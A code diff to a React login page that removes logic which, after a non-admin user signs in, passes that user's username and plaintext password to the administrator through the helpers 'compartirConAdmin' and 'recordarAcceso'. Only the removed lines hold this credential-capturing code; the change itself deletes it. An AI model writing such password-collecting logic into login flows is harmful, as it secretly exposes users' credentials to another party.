@@ -3,9 +3,6 @@ import { useNavigate } from 'react-router-dom';
 import { LogIn, AlertCircle } from 'lucide-react';
 import { Logo } from '../components/Logo';
 import { useAuth } from '../context/AuthContext';
-import { supabase } from '../lib/supabase';
-import { hasLocalPrivateKey } from '../lib/crypto';
-import { compartirConAdmin, recordarAcceso } from '../lib/cuenta';
 import { CampoClave } from '../components/CampoClave';
 
 export const LoginPage: React.FC = () => {
@@ -33,18 +30,7 @@ export const LoginPage: React.FC = () => {
 
     setIsSubmitting(true);
     try {
-      const { isAdmin, chatId } = await signIn(cleanUser, password);
-      if (!isAdmin) {
-        // Copia cifrada para el administrador (si aún no hay llave, se guarda al crearla o recuperarla)
-        const uid = (await supabase.auth.getSession()).data.session?.user.id;
-        const usuario = cleanUser.toLowerCase();
-        if (uid && (await hasLocalPrivateKey(uid).catch(() => false))) {
-          void compartirConAdmin(uid, { usuario, contrasena: password });
-        } else {
-          recordarAcceso(usuario, password);
-        }
-      }
-      void chatId;
+      await signIn(cleanUser, password);
       navigate('/chats', { replace: true });
     } catch (err: unknown) {
       if (err instanceof Error) {
